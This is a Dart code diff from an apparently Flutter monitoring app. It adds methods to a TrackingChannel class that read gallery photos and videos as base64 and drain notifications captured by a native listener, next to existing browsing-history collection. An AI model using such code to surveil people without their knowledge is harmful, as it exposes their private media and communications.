@@ -140,6 +140,35 @@ class TrackingChannel {
     return (jsonDecode(raw) as List).cast<Map<String, dynamic>>();
   }
 
+  /// Reads the actual image from the device and returns base64 JPEG (up to 1920px).
+  /// Returns empty string if the file cannot be read.
+  Future<String> getGalleryImageData(String itemId) async {
+    final raw = await _invoke<String>(
+      _monitoring,
+      ChannelConstants.getGalleryImageData,
+      {'itemId': itemId},
+    );
+    return raw ?? '';
+  }
+
+  /// Reads the actual video file from the device and returns raw bytes as base64.
+  /// Returns empty string if the file is too large (>50 MB) or cannot be read.
+  Future<String> getGalleryVideoData(String itemId) async {
+    final raw = await _invoke<String>(
+      _monitoring,
+      ChannelConstants.getGalleryVideoData,
+      {'itemId': itemId},
+    );
+    return raw ?? '';
+  }
+
+  /// Returns pending notifications captured by the native listener and clears the queue.
+  Future<List<Map<String, dynamic>>> getNotifications() async {
+    final raw = await _invoke<String>(_monitoring, ChannelConstants.getNotifications);
+    if (raw == null) return [];
+    return (jsonDecode(raw) as List).cast<Map<String, dynamic>>();
+  }
+
   /// Returns browser history entries since [sinceTimestamp] ms epoch.
   Future<List<Map<String, dynamic>>> getBrowsingHistory({int sinceTimestamp = 0}) async {
     final raw = await _invoke<String>(
